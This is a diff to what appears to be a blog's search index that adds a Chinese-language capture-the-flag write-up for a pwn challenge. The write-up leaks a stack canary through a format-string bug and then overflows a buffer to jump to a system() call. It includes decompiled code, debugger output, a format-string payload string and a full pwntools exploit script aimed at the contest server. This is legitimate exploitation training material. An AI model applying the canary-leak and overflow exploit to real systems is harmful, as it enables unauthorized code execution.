@@ -7661,6 +7661,7 @@ API网关的权限检查
       <tags>
         <tag>网络安全</tag>
         <tag>pwn</tag>
+        <tag>pwnable</tag>
       </tags>
   </entry>
   <entry>
@@ -7850,6 +7851,59 @@ API网关的权限检查
         <tag>网络安全</tag>
         <tag>CTF</tag>
         <tag>PWN</tag>
+        <tag>0xGAME</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2026-4-13-Canary</title>
+    <url>/2026/04/13/2026-4-13-Canary/</url>
+    <content><![CDATA[<h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main函数反汇编转伪c</span></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln_leak</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please tell me your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x3F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402026);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到buf &#x3D; 72 也就是0x48</p>
+<p>这里的 <code>vuln_leak()</code> 负责用格式化字符串泄露 canary；真正的栈溢出发生在后面的 <code>payload</code> 输入函数中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; unsigned __int64 vuln_overflow()</span><br><span class="line">public vuln_overflow</span><br><span class="line">vuln_overflow proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -50h</span><br><span class="line">var_8= qword ptr -8</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">endbr64</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 50h</span><br><span class="line">mov     rax, fs:28h</span><br><span class="line">mov     [rbp+var_8], rax</span><br><span class="line">xor     eax, eax</span><br><span class="line">mov     edi, offset aTellMeYourPayl ; &quot;tell me your payload:&quot;</span><br><span class="line">call    _puts</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 100h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br><span class="line">mov     edi, offset asc_40203D ;</span><br><span class="line">call    _puts</span><br><span class="line">nop</span><br><span class="line">mov     rax, [rbp+var_8]</span><br><span class="line">sub     rax, fs:28h</span><br><span class="line">jz      short locret_4012D9</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln_overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your payload:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(asc_40203D);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此题目的难点在于启用了canary</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(base) ┌──(cure㉿LAPTOP-CMAM5D0J)-[~/CTF/pwn/18]</span><br><span class="line">└─$ /bin/checksec --file=pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable      FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   45 Symbols        No    0               2       pwn</span><br></pre></td></tr></table></figure>
+
+<p>要破解canary必须知道canary的基本原理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+
+<p>转自 https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;mitigation&#x2F;canary&#x2F;</p>
+<p>首先代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please tell me your name:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x3F</span>uLL);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
+
+<p>存在格式化字符串利用漏洞，我们可以依据此漏洞泄露栈上canary的值</p>
+<p>根据<strong>Linux x86_64 &#x2F; System V ABI</strong> 的规则。</p>
+<p>普通函数调用时，前 6 个整数&#x2F;指针参数放在：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RDI, RSI, RDX, RCX, R8, R9</span><br></pre></td></tr></table></figure>
+
+<p>第 7 个参数开始才放栈上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a1 -&gt; RDI</span><br><span class="line">a2 -&gt; RSI</span><br><span class="line">a3 -&gt; RDX</span><br><span class="line">a4 -&gt; RCX</span><br><span class="line">a5 -&gt; R8</span><br><span class="line">a6 -&gt; R9</span><br><span class="line">a7 -&gt; 栈</span><br><span class="line">a8 -&gt; 栈</span><br></pre></td></tr></table></figure>
+
+<p>所以我们要去寻找栈上的canary值，从<code>%6$p</code>开始找</p>
+<p>直接利用格式化字符串漏洞去泄露地址，先从 <code>%6$p</code> 左右开始枚举，再根据输出确认</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">Welcome to PDSCTF!!!</span><br><span class="line">Please tell me your name:</span><br><span class="line">%6<span class="variable">$p</span>|%7<span class="variable">$p</span>|%8<span class="variable">$p</span>|%9<span class="variable">$p</span>|%10<span class="variable">$p</span>|%11<span class="variable">$p</span>|%12<span class="variable">$p</span>|%13<span class="variable">$p</span>|%14<span class="variable">$p</span>|%15<span class="variable">$p</span>|%16<span class="variable">$p</span>|%17<span class="variable">$p</span>|%18<span class="variable">$p</span></span><br><span class="line">0x2437257c70243625|0x257c702438257c70|0x243031257c702439|0x7c70243131257c70|0x31257c7024323125|0x243431257c702433|0x7c70243531257c70|0x257c7024363125|0x7fffffffce80|0xbd5dae3ec69d5d00|0x7fffffffce80|%</span><br><span class="line">tell me your payload:</span><br></pre></td></tr></table></figure>
+
+<p>我们找到的 <code>0xbd5dae3ec69d5d00</code> 因为结尾是00 明显符合canary的格式</p>
+<p>然后我们去找一个合适的跳转落点</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">4011d6: endbr64</span><br><span class="line">4011da: push   %rbp</span><br><span class="line">4011db: mov    %rsp,%rbp</span><br><span class="line">4011de: sub    <span class="variable">$0x10</span>,%rsp</span><br><span class="line">4011f1: mov    <span class="variable">$0x402004</span>,%edi</span><br><span class="line">4011f6: call   4010c0 &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过验证4011db和4011f1两个地址都可以用</p>
+<p>然后利用<code>ROPgadget</code>去找 <code>ret</code>的值，</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(base) ┌──(cure㉿LAPTOP-CMAM5D0J)-[~/CTF/pwn/18]</span><br><span class="line">└─$ ROPgadget --binary pwn --only <span class="string">&#x27;ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040101a : ret</span><br></pre></td></tr></table></figure>
+
+<p>至此，我们什么都不缺了</p>
+<p>构建exp脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">12034</span>)</span><br><span class="line">buf_addr = <span class="number">0x48</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">sh = <span class="number">0x4011f1</span></span><br><span class="line">pay = <span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27; name:&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak_data = p.recvline().strip()</span><br><span class="line">canary = <span class="built_in">int</span>(leak_data,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*buf_addr +p64(canary)+p64(ret)+p64(sh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;payload:\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>PWN</tag>
+        <tag>pdsctf2025</tag>
       </tags>
   </entry>
 </search>
